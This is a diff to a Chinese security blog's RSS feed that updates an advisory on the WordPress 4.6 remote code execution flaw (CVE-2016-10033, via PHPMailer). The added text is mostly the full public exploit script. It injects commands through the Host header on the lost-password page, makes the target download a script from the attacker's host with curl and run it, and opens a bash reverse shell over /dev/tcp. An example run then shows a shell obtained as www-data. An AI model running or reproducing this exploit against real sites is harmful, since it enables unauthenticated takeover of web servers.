@@ -10,18 +10,18 @@
     <atom:link href="http://blog.shellpub.com/topics/wordpress/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
-      <title>漏洞预警-WordPress Core远程代码执行0day</title>
+      <title>漏洞预警-WordPress Core远程代码执行</title>
       <link>http://blog.shellpub.com/2017/05/03/wordpress_core_remote_code_excute.html</link>
       <pubDate>Wed, 03 May 2017 13:46:17 +0800</pubDate>
       
       <guid>http://blog.shellpub.com/2017/05/03/wordpress_core_remote_code_excute.html</guid>
       <description>
 
-&lt;h1 id=&#34;漏洞预警-wordpress-core远程代码执行0day-无需验证和插件&#34;&gt;漏洞预警-WordPress Core远程代码执行0day(无需验证和插件)&lt;/h1&gt;
+&lt;h1 id=&#34;漏洞预警-wordpress-core远程代码执行-无需验证和插件&#34;&gt;漏洞预警-WordPress Core远程代码执行(无需验证和插件)&lt;/h1&gt;
 
 &lt;p&gt;&lt;center&gt;&lt;img src=&#34;https://www.tripwire.com/state-of-security/wp-content/uploads/sites/3/wp-featured.jpeg&#34; alt=&#34;&#34; /&gt;&lt;/center&gt;&lt;/p&gt;
 
-&lt;p&gt;2017年5月1日，&lt;strong&gt;WordPress&lt;/strong&gt; 被曝出远程代码执行（RCE）漏洞，国外legalhackers发布该漏洞利用视频，从被曝出的视频中可以看到该漏洞不需要验证，同时不需要安装任何插件即可获取反弹的shell，目前该漏洞官方尚未回应。另外，漏洞细节legalhackers并未公布。预计等待官方发布补丁后会放出。&lt;/p&gt;
+&lt;p&gt;2017年5月1日，&lt;strong&gt;WordPress&lt;/strong&gt; 4.6版本被曝出远程代码执行（RCE）漏洞，国外legalhackers发布该漏洞利用视频，从被曝出的视频中可以看到该漏洞在不需要验证，同时不需要安装任何插件即可获取反弹的shell。北京时间2017年5月4日，legalhackers发布了相关漏洞利用代码。&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;WordPress&lt;/strong&gt;是一款由PHP语言开发的内容管理系统（CMS）系统。是当今最流行的cms，很适合二次开发，使用量超过百万。潜在影响范围广泛，请大家在官方补丁出来之前，提早做好防范。以免带来不必要的麻烦。&lt;/p&gt;
 
@@ -33,6 +33,273 @@ google搜索Wordpress的结果
 &lt;p&gt;我们将持续关注此漏洞&lt;/p&gt;
 
 &lt;h2 id=&#34;漏洞详情与poc&#34;&gt;漏洞详情与PoC&lt;/h2&gt;
+
+&lt;p&gt;该漏洞主要是由于使用了存在漏洞的PHPMailer，导致存在远程代码执行漏洞。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/bin/bash
+#
+#      __                     __   __  __           __
+#     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
+#    / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
+#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,&amp;lt; /  __/ /  (__  )
+#  /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
+#            /____/
+#
+#
+# WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit
+# CVE-2016-10033
+#
+# wordpress-rce-exploit.sh (ver. 1.0)
+#
+#
+# Discovered and coded by
+#
+# Dawid Golunski (@dawid_golunski)
+# https://legalhackers.com
+#
+# ExploitBox project:
+# https://ExploitBox.io
+#
+# Full advisory URL:
+# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
+#
+# Exploit src URL:
+# https://exploitbox.io/exploit/wordpress-rce-exploit.sh
+#
+#
+# Tested on WordPress 4.6:
+# https://github.com/WordPress/WordPress/archive/4.6.zip
+#
+# Usage:
+# ./wordpress-rce-exploit.sh target-wordpress-url
+#
+#
+# Disclaimer:
+# For testing purposes only
+#
+#
+# -----------------------------------------------------------------
+#
+# Interested in vulns/exploitation?
+#
+#
+#                        .;lc&#39;
+#                    .,cdkkOOOko;.
+#                 .,lxxkkkkOOOO000Ol&#39;
+#             .&#39;:oxxxxxkkkkOOOO0000KK0x:&#39;
+#          .;ldxxxxxxxxkxl,.&#39;lk0000KKKXXXKd;.
+#       &#39;:oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.
+#      &#39;&#39;;ldxxxxxdc,.              ,oOXXXNNNXd;,.
+#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
+#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
+#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
+#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
+#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
+#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
+#     .dxxxxxc      .cNMMMN.oMMMMx&#39;      .xxxxxx:
+#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    &#39;xxxxxx:
+#     .dxxxxxc    ;Mc   .lx.:o,    Kl    &#39;xxxxxx:
+#     .dxxxxxdl;. .,               .. .;cdxxxxxx:
+#     .dxxxxxxxxxdc,.              &#39;cdkkxxxxxxxx:
+#      .&#39;:oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.
+#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.
+#             .&#39;:oxxxxxxxxx.ckkkkkkkkxl,.
+#                 .,cdxxxxx.ckkkkkxc.
+#                    .&#39;:odx.ckxl,.
+#                        .,.&#39;.
+#
+# https://ExploitBox.io
+#
+# https://twitter.com/Exploit_Box
+#
+# -----------------------------------------------------------------
+
+
+
+rev_host=&amp;quot;192.168.57.1&amp;quot;
+
+function prep_host_header() {
+      cmd=&amp;quot;$1&amp;quot;
+      rce_cmd=&amp;quot;\${run{$cmd}}&amp;quot;;
+
+      # replace / with ${substr{0}{1}{$spool_directory}}
+      #sed &#39;s^/^${substr{0}{1}{$spool_directory}}^g&#39;
+      rce_cmd=&amp;quot;`echo $rce_cmd | sed &#39;s^/^\${substr{0}{1}{\$spool_directory}}^g&#39;`&amp;quot;
+
+      # replace &#39; &#39; (space) with
+      #sed &#39;s^ ^${substr{10}{1}{$tod_log}}$^g&#39;
+      rce_cmd=&amp;quot;`echo $rce_cmd | sed &#39;s^ ^\${substr{10}{1}{\$tod_log}}^g&#39;`&amp;quot;
+      #return &amp;quot;target(any -froot@localhost -be $rce_cmd null)&amp;quot;
+      host_header=&amp;quot;target(any -froot@localhost -be $rce_cmd null)&amp;quot;
+      return 0
+}
+
+
+#cat exploitbox.ans
+intro=&amp;quot;
+DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r
+bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f
+G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c
+G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg
+IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f
+IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f
+X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6
+b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb
+NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N
+TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1
+QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz
+NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g
+G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54
+eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb
+WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO
+TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg
+ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb
+MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD
+G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob
+WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz
+NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb
+MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f
+X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4
+bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K&amp;quot;
+intro2=&amp;quot;
+ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09
+fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb
+MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE
+aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09
+fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg
+ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh
+bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt
+ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp
+bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1
+cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==&amp;quot;
+echo &amp;quot;$intro&amp;quot;  | base64 -d
+echo &amp;quot;$intro2&amp;quot; | base64 -d
+
+if [ &amp;quot;$#&amp;quot; -ne 1 ]; then
+echo -e &amp;quot;Usage:\n$0 target-wordpress-url\n&amp;quot;
+exit 1
+fi
+target=&amp;quot;$1&amp;quot;
+echo -ne &amp;quot;\e[91m[*]\033[0m&amp;quot;
+read -p &amp;quot; Sure you want to get a shell on the target &#39;$target&#39; ? [y/N] &amp;quot; choice
+echo
+
+
+if [ &amp;quot;$choice&amp;quot; == &amp;quot;y&amp;quot; ]; then
+
+echo -e &amp;quot;\e[92m[*]\033[0m Guess I can&#39;t argue with that... Let&#39;s get started...\n&amp;quot;
+echo -e &amp;quot;\e[92m[+]\033[0m Connected to the target&amp;quot;
+
+# Serve payload/bash script on :80
+RCE_exec_cmd=&amp;quot;(sleep 3s &amp;amp;&amp;amp; nohup bash -i &amp;gt;/dev/tcp/$rev_host/1337 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1) &amp;amp;&amp;quot;
+echo &amp;quot;$RCE_exec_cmd&amp;quot; &amp;gt; rce.txt
+python -mSimpleHTTPServer 80 2&amp;gt;/dev/null &amp;gt;&amp;amp;2 &amp;amp;
+hpid=$!
+
+# Save payload on the target in /tmp/rce
+cmd=&amp;quot;/usr/bin/curl -o/tmp/rce $rev_host/rce.txt&amp;quot;
+prep_host_header &amp;quot;$cmd&amp;quot;
+curl -H&amp;quot;Host: $host_header&amp;quot; -s -d &#39;user_login=admin&amp;amp;wp-submit=Get+New+Password&#39; $target/wp-login.php?action=lostpassword
+echo -e &amp;quot;\n\e[92m[+]\e[0m Payload sent successfully&amp;quot;
+
+# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce
+cmd=&amp;quot;/bin/bash /tmp/rce&amp;quot;
+prep_host_header &amp;quot;$cmd&amp;quot;
+curl -H&amp;quot;Host: $host_header&amp;quot; -d &#39;user_login=admin&amp;amp;wp-submit=Get+New+Password&#39; $target/wp-login.php?action=lostpassword &amp;amp;
+echo -e &amp;quot;\n\e[92m[+]\033[0m Payload executed!&amp;quot;
+
+echo -e &amp;quot;\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n&amp;quot;
+nc -vv -l 1337
+echo
+else
+echo -e &amp;quot;\e[92m[+]\033[0m Responsible choice ;) Exiting.\n&amp;quot;
+exit 0
+
+fi
+
+
+echo &amp;quot;Exiting...&amp;quot;
+exit 0
+
+
+
+
+Video PoC
+~~~~~~~~~~~~
+
+https://www.youtube.com/watch?v=ZFt_S5pQPX0
+
+
+
+Example run
+~~~~~~~~~~~~~~~
+
+# ./wordpress-rce-exploit.sh http://wp-host/wordpress/
+
+                        .;lc&#39;
+                    .,cdkkOOOko;.
+ _______        ., ________     ________      _______
+ \  ___/_ ____ &#39;___\      /_____\      _______\_   _/_
+ /  _/   \\   \/   /   __/     //   |  \_____//       \
+/_________&amp;gt;&amp;gt;      &amp;lt; __/  /    /-\ ____ /     \ _______/
+          &amp;lt;___/\___&amp;gt;    /________/    /_______&amp;gt;
+     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
+     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
+     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
+     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
+     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
+     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
+     .dxxxxxc      .cNMMMN.oMMMMx&#39;      .xxxxxx:
+     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    &#39;xxxxxx:
+     .dxxxxxc    ;Mc   .lx.:o,    Kl    &#39;xxxxxx:
+     .dxxxxxdl;. .,               .. .;cdxxxxxx:
+     .dxxxx ________          ____  _____ xxxxx:
+      .&#39;:ox \      /_ ________\   \/    / xxc,.
+          . /     /  \\        &amp;gt;       &amp;lt;  x,
+           /          /   |   /   /\    \
+           \_________&amp;lt;_______&amp;lt;____&amp;gt; \____&amp;gt;
+                    .&#39;:odx.ckxl,.
+                        .,.&#39;.
+
+                 | ExploitBox.io |
+
++ --=| Wordpress Core - Unauthenticated RCE Exploit  |
++ --=|                                               |
++ --=|          Discovered &amp;amp; Coded By                |
++ --=|               Dawid Golunski                  |
++ --=|         https://legalhackers.com              |
++ --=|                                               |
++ --=| &amp;quot;With Great Power Comes Great Responsibility&amp;quot; |
++ --=|        * For testing purposes only *          |
+
+
+[*] Sure you want to get a shell on the target &#39;http://wp-host/wordpress/&#39; ? [y/N] y
+
+[*] Guess I can&#39;t argue with that... Let&#39;s get started...
+
+[+] Connected to the target
+
+[+] Payload sent successfully
+
+[+] Payload executed!
+
+[*] Waiting for the target to send us a reverse shell...
+
+Listening on [0.0.0.0] (family 0, port 1337)
+Connection from [192.168.57.3] port 1337 [tcp/*] accepted (family 2, sport 39232)
+bash: cannot set terminal process group (10408): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@xenial:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@xenial:/$ exit
+exit
+exit
+
+Exiting...
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;视频中有相关利用成功的演示。演示结果如下（详细请看视频，文中结尾处有）：
 &lt;center&gt;
